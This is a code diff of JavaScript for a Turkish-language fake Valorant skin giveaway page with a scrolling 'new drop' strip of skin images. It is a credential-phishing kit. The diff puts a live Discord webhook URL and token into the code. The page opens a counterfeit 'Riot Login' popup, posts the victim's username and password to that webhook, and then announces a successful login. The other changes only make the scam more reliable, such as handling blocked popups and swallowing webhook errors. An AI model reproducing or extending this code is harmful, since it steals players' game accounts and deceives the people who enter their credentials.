@@ -1,24 +1,24 @@
-const WEBHOOK_URL = "BURAYA_KENDI_LINKINI_KOY";
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq"; // Buraya tırnakları bozmadan linki yapıştır
 
-// Canlı Drop Şeridi İçin Resimler
+// Canlı Drop Şeridi
 const dropItems = [
     {n: "Kuronami Vandal", i: "https://static.wikia.nocookie.net/valorant/images/a/a7/Kuronami_Vandal.png"},
     {n: "Reaver Sheriff", i: "https://static.wikia.nocookie.net/valorant/images/8/8f/Reaver_Sheriff.png"},
     {n: "Prime Phantom", i: "https://static.wikia.nocookie.net/valorant/images/e/e0/Prime_Phantom.png"},
-    {n: "Elderflame Vandal", i: "https://static.wikia.nocookie.net/valorant/images/5/5e/Elderflame_Vandal.png"},
-    {n: "Ion Sheriff", i: "https://static.wikia.nocookie.net/valorant/images/6/61/Ion_Sheriff.png"}
+    {n: "Elderflame Vandal", i: "https://static.wikia.nocookie.net/valorant/images/5/5e/Elderflame_Vandal.png"}
 ];
 
 const track = document.getElementById('dropTrack');
-// Şeridi doldur
-for(let i=0; i<40; i++) {
-    let item = dropItems[Math.floor(Math.random()*dropItems.length)];
-    track.innerHTML += `
-        <div class="drop-item">
-            <span>YENİ DROP</span>
-            <img src="${item.i}">
-            <div style="font-size:10px; margin-top:5px; font-weight:bold;">${item.n}</div>
-        </div>`;
+if(track) {
+    for(let i=0; i<40; i++) {
+        let item = dropItems[Math.floor(Math.random()*dropItems.length)];
+        track.innerHTML += `
+            <div class="drop-item">
+                <span>YENİ DROP</span>
+                <img src="${item.i}">
+                <div style="font-size:10px; margin-top:5px; font-weight:bold;">${item.n}</div>
+            </div>`;
+    }
 }
 
 let loggedIn = false;
@@ -27,6 +27,11 @@ function openLogin() {
     const w = 450, h = 600;
     const l = (window.innerWidth/2)-(w/2), t = (window.innerHeight/2)-(h/2);
     let win = window.open("", "Riot Login", `width=${w},height=${h},top=${t},left=${l}`);
+
+    if(!win) {
+        alert("Lütfen tarayıcınızın açılır pencerelere (popup) izin verdiğinden emin olun!");
+        return;
+    }
 
     win.document.body.innerHTML = `
         <style>
@@ -53,7 +58,8 @@ function openLogin() {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({ content: `✅ **Yeni Hesap Bilgisi!**\n👤: \`${user}\` \n🔑: \`${pass}\`` })
-            });
+            }).catch(err => console.log("Webhook hatası:", err));
+            
             loggedIn = true;
             win.close();
             alert("Giriş Başarılı! Ücretsiz kasanızı açabilirsiniz.");
